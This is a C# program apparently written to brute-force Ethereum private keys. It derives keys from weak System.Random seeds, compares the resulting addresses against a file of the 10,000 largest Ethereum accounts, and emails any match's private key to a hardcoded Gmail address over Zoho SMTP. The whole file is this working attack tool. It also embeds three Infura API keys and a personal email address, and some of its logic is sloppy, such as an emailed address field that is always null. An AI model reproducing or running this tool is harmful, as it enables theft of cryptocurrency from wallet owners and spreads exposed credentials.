using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Nethereum.Hex.HexConvertors.Extensions;
using Nethereum.Hex.HexTypes;
using Nethereum.Signer;
using Nethereum.Web3;
using Org.BouncyCastle.Asn1.Sec;
using Org.BouncyCastle.Math;

namespace EthBrute
{
    enum Mode
    {
        Hex32Bytes_RandomChars,
        Hex32Bytes_1Int,
        Hex32Bytes_8Int,
        Hex32Bytes_StackOverflowExample
    }

    internal class Program
    {
        // GLOBAL VARIABLES
        private static int debugCount;
        private const int debugPrintOnConsole = 10000;
        private static Stopwatch stopWatch = new Stopwatch();
        private static Random RandomManager;
        private static string charDomain = "0123456789ABCDEF";
        private const string newLine = "<br />";
        private static List<long> seeds = new List<long>();
        public static bool debug = false;
        private static int nrPrivKeysTested;
        private static int defaultMode = 2;

        private static void Main(string[] args)
        {
            // USAGE MENU
            Console.WriteLine("Usage : .exe [int@infuraKey] [int@mode] [bool@HardCodeSeed]");
            Console.WriteLine("");

            // DEBUG
            if (args.Length == 0)
            {
                GetAccountBalance(GetApiKey(0), (Mode)Enum.ToObject(typeof(Mode), defaultMode)).Wait();
            }
            // RELEASE
            else
            {
                GetAccountBalance(GetApiKey(int.Parse(args[0])), (Mode)Enum.ToObject(typeof(Mode), int.Parse(args[1]))).Wait();
            }
        }



        private static async Task GetAccountBalance(string apiKey, Mode mode, bool hardCodeSeeds = true)
        {
            // PRINT
            Console.WriteLine("================");
            Console.WriteLine("MODE : " + mode);
            Console.WriteLine("HardCodeSeeds : " + hardCodeSeeds);
            Console.WriteLine("================");

            stopWatch.Start();

            // SET UP TARGET ADDRESS
            var targetAddresss = TargetAddresss();

            while (true)
            {
                if (hardCodeSeeds)
                {
                    seeds.Clear();
                    seeds.Add(new Random(RandomHashCode()).Next(int.MaxValue));
                }

                foreach (var seed in seeds.Concat(new List<long>()))
                {
                    nrPrivKeysTested++;

                    // SEED MANAGER
                    var truncatedSeed = (seed < 2147483647 ? int.Parse(seed.ToString()) : int.Parse("1" + seed.ToString().Substring(0, 9)));
                    RandomManager = new Random(truncatedSeed);
                    var seedToHex = SafeIntToHex(truncatedSeed);

                    // flags
                    var error = false;
                    string address = null;
                    HexBigInteger transactionsMainNet = null;

                    // MAIN VARIABLES
                    var privKey = string.Empty;

                    switch (mode)
                    {
                        case Mode.Hex32Bytes_RandomChars:
                            privKey = AddEthAddressPadding(ReverseArraySafe(PrivKeyOnSeed(64)));
                            break;
                        // mode 1
                        case Mode.Hex32Bytes_1Int:
                            privKey = AddEthAddressPadding(string.Concat(Enumerable.Repeat(seedToHex, 8)));
                            break;
                        // mode 2
                        case Mode.Hex32Bytes_8Int:
                            var stringsToHexs = new StringBuilder(string.Empty);
                            for (var i = 0; i < 8; i++)
                                // prepend
                                stringsToHexs.Insert(0, SafeIntToHex(RandomManager.Next(0, int.MaxValue)));
                            privKey = AddEthAddressPadding(stringsToHexs.ToString());
                            break;
                        // example case in stack overflow question
                        case Mode.Hex32Bytes_StackOverflowExample:
                            privKey = "0x" + "699EE77F6467211CDD03F4012B6FEA9377EBD34F107D18C5509CE6AD85113C00";
                            break;
                    }

                    // DEBUG
                    if (debug)
                    {
                        Console.WriteLine("Seed : " + seed);
                        Console.WriteLine("Truncated Seed : " + truncatedSeed);
                        Console.WriteLine("HEX Seed : 0x" + seedToHex);
                        Console.WriteLine("Char Domain : " + charDomain);
                        Console.WriteLine("Private Key : " + privKey);
                        Console.WriteLine("Public  key : " + new EthECKey(privKey).GetPubKey().ToHex().Substring(2));
                        Console.WriteLine("Etherum Address : " + new EthECKey(privKey).GetPublicAddress());
                        Console.WriteLine("Count " + nrPrivKeysTested);
                        Console.WriteLine("");
                        Console.ReadLine();
                    }

                    if (targetAddresss.Contains(new EthECKey(privKey).GetPublicAddress()))
                        SendRawEmail("my.mail.alin@gmail.com", "Key Found", "GOD",
                            $"Address: {address}{newLine}Key: {privKey}{newLine}"
                        );

                    if (++debugCount != debugPrintOnConsole) continue;

                    // reset
                    debugCount = 0;
                    stopWatch.Stop();
                    Console.WriteLine("+" + debugPrintOnConsole + " | " + stopWatch.Elapsed.ToString("mm\\:ss\\.ff"));
                    stopWatch.Reset();
                    stopWatch.Start();
                }
            }
        }

        #region external resources MANAGER

        private static HashSet<string> TargetAddresss()
        {
            var targetAddresss = new HashSet<string>();
            string line;
            // https://ipfs.io/ipfs/QmSBSeLposVePVhr7VP28d2NFegqA4R6aSo2jaGi5mRZKo
            var file = new StreamReader(Environment.CurrentDirectory + @"\\EthTop10000Address.txt");
            while ((line = file.ReadLine()) != null)
            {
                targetAddresss.Add(line);
            }

            Console.WriteLine("Uploaded target ETH address");
            Console.WriteLine("Starting machine ...");
            return targetAddresss;
        }

        #endregion

        #region String Manager

        public static List<int> AllIndexesOf(string str, string value)
        {
            if (string.IsNullOrEmpty(value))
                throw new ArgumentException("the string to find may not be empty");
            var indexes = new List<int>();
            for (var index = 0; ; index += value.Length)
            {
                index = str.IndexOf(value, index);
                if (index == -1)
                    return indexes;
                indexes.Add(index);
            }
        }

        private static string SafeIntToHex(int nr)
        {
            return nr.ToString("X2").PadLeft(8, '0');
        }

        private static string GetApiKey(int index)
        {
            if (index == 0)
            {
                return "d229322ae59b48519825fd884a0388e1";
            }
            if (index == 1)
            {
                return "8187c375b1c6445fbce7954e64a830cb";
            }
            if (index == 2)
            {
                return "9ff432eedf61410b8723be3fcb968c92";
            }
            throw new Exception();
        }

        private static string ReverseArraySafe(string input)
        {
            return new string(input.Reverse().ToArray());
        }

        private static string AddEthAddressPadding(string input)
        {
            return "0x" + input.PadLeft(64, '0');
        }

        private static int RandomHashCode()
        {
            return Guid.NewGuid().GetHashCode();
        }

        #endregion

        #region Send Email on SUCCESS

        public static SmtpClient GetSmtp()
        {
            const string email = "demo";
            const string pass = "demo";

            return new SmtpClient
            {
                Port = 587,
                Host = "smtp.zoho.com",
                EnableSsl = true,
                Timeout = 10000,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(email, pass)
            };
        }

        private static void SendRawEmail(string sendToEmail, string subject, string sendBy, string body, bool retry = false)
        {
            using (var client = GetSmtp())
            {
                // who are we sending the email to
                var destination = client.Credentials.GetCredential("smtp.zoho.com", 587, "").UserName;

                // prepare the email
                var mm = new MailMessage(new MailAddress(destination, sendBy), new MailAddress(sendToEmail, ""))
                {
                    Subject = subject,
                    Body = body,
                    BodyEncoding = Encoding.UTF8,
                    IsBodyHtml = true
                };

                //send the email
                try
                {
                    client.Send(mm);

                    // it will take a bit longer but at least we don't spam zoho && we catch the exception
                    // 10 sec
                    Thread.Sleep(10000);
                }

                // if there was a problem with the email
                catch
                {
                    // only 1 retry
                    if (retry == false)
                        // recursive call to make sure we send this email
                        SendRawEmail(sendToEmail, subject, sendBy, body, true);
                }
            }
        }

        #endregion

        #region HELPERS : Random Generetors

        public static string Shuffle(string str)
        {
            var array = str.ToCharArray();
            var rng = new Random(RandomHashCode());
            var n = array.Length;
            while (n > 1)
            {
                n--;
                var k = rng.Next(n + 1);
                var value = array[k];
                array[k] = array[n];
                array[n] = value;
            }
            return new string(array);
        }

        public static string PrivKeyOnSeed(int length)
        {
            return new string(Enumerable.Repeat(charDomain, length)
                .Select(s => s[RandomManager.Next(s.Length)]).ToArray());
        }

        #endregion

        #region DateTime since ETH DOB

        internal class RandomDateTime
        {
            private DateTime start;
            private readonly Random gen;
            private int range;

            public RandomDateTime()
            {
                // ETH DOB
                start = new DateTime(2015, 7, 30).AddHours(15).AddMinutes(26).AddSeconds(13);

                // random date generator
                gen = new Random(RandomHashCode());

                // days from DOB to today
                range = (DateTime.Today - start).Days;
            }

            public DateTime Next()
            {
                var temp = start.AddDays(gen.Next(range)).AddHours(gen.Next(0, 24)).AddMinutes(gen.Next(0, 60)).AddSeconds(gen.Next(0, 60)).AddTicks(gen.Next(0, 1000000000));
                return temp;
            }
        }

        #endregion

        #region Low Level Algh

        public static Tuple<byte[], byte[]> Ecdsa(byte[] privateKey)
        {
            var privKeyInt = new BigInteger(+1, privateKey);

            var parameters = SecNamedCurves.GetByName("secp256k1");
            var qa = parameters.G.Multiply(privKeyInt);

            var pubKeyX = qa?.X.ToBigInteger().ToByteArrayUnsigned();
            var pubKeyY = qa?.Y.ToBigInteger().ToByteArrayUnsigned();

            return Tuple.Create(pubKeyX, pubKeyY);
        }

        #endregion
    }
}
